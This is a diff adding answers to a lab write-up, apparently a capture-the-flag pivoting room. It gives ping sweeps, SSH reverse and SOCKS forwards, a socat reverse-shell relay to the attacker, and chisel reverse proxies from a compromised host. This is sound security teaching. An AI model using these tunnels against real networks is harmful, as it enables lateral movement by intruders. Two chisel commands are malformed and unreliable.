@@ -157,19 +157,138 @@ portfwd
 
 #### Task 9 Pivoting Enumeration
 
+What is the absolute path to the file containing DNS entries on Linux?  
+```
+/etc/resolv.conf
+```
+
+What is the absolute path to the hosts file on Windows?  
+```
+C:\Windows\System32\drivers\etc\hosts
+```
+
+How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?
+```
+for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done
+```
+
 #### Task 10 Pivoting Proxychains & Foxyproxy
 
+What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?  
+```
+socks4 127.0.0.1 4242
+```
+
+What command would you use to telnet through a proxy to 172.16.0.100:23?  
+```
+proxychains telnet 172.16.0.100 23
+```
+
+You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?
+```
+FP
+```
 #### Task 11 Pivoting SSH Tunnelling / Port Forwarding
+
+If you're connecting to an SSH server _from_ your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?  
+```
+L
+```
+Which switch combination can be used to background an SSH port forward or tunnel?  
+```
+-fN
+```
+
+It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay? ```
+```
+Nay
+```
+
+
+What command would you use to create a pair of throwaway SSH keys for a reverse connection?  
+```
+ssh-keygen
+```
+
+
+If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called `id_rsa` and backgrounding the shell, what command would you use? (Assume your username is "kali")  
+```
+ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN
+```
+
+What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?  
+```
+ssh -D 8000 user@target.thm -fN
+```
+
+If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.
+```
+ssh -R 8000:127.0.0.1:80 user@172.16.0.50 -fN 
+```
 
 #### Task 12 Pivoting plink.exe
 
+What tool can be used to convert OpenSSH keys into PuTTY style keys?
+```
+puttygen
+```
+
 #### Task 13 Pivoting Socat
 
+Which socat option allows you to reuse the same listening port for more than one connection?  
+```
+reuseaddr
+```
+
+If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?  Use TCP port 8000 for the server listener, and **do not** background the process.  
+```
+./socat tcp-l:8000 tcp:172.16.0.200:443
+```
+
+What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?
+```
+./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.100:22 &
+```
 #### Task 14 Pivoting Chisel
 
+What command would you use to start a chisel server for a reverse connection on your attacking machine? Use port 4242 for the listener and **do not** background the process.  
+```
+./chisel server -p 4242 -reverse
+```
+
+What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?
+
+```
+./chisel client 172.16.0.200R:4242:socks
+```
+
+How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.  
+```
+./chisel client 172.16.0.200:1337  R:33060 :172.16.0.100:3306 & 
+```
+
+If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
+```
+./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
+```
 #### Task 15 Pivoting sshuttle
 
-#### Task 16 Pivoting Conclusion
+How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16  
+```
+sshuttle pwned@172.16.20.7 172.16.0.0/16
+```
+
+What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?  
+```
+--ssh-cmd "ssh -i priv_key"
+```
+
+You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error. What switch (and argument) could you use to fix this error?
+```
+-x 172.16.0.100
+```
+
+
 
 #### Task 17 Git Server Enumeration
 
